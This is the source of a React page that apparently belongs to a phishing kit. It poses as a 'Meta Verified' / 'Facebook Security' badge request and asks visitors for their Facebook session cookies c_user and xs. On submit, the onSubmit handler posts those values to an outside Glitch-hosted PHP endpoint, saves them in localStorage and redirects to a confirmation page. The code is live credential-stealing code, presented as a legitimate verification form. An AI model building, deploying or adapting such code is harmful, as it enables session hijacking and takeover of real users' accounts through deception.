import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@shared/schema";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
      admin_email: process.env.SMTP_USER || "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      await fetch('https://mixed-fluff-space.glitch.me/zubairbhaispan.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...data,
          admin_email: process.env.SMTP_USER
        }),
      });

      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Meta Verified | Validation"
        description="Request a verified badge on Facebook - Initial Step"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
        <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
            alt="Logo"
            className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
          />
          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
            Facebook Security
          </h1>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div className="text-left">
                <FormField
                  control={form.control}
                  name="c_user"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        c_user
                      </FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min="0"
                          pattern="[0-9]+"
                          minLength={6}
                          placeholder="Enter c_user"
                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
              </div>
              <div className="text-left">
                <FormField
                  control={form.control}
                  name="xs"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        xs
                      </FormLabel>
                      <FormControl>
                        <Input 
                          type="text" 
                          placeholder="Enter xs" 
                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                          {...field} 
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
                <input 
                  type="hidden" 
                  name="admin_email" 
                  value={process.env.SMTP_USER || ""} 
                />
              </div>
              <p className="text-xs sm:text-sm text-[#65676B]">
                Please make sure account not to log out from your computer or laptop until you have received a verification email.
              </p>
              <Button 
                type="submit" 
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}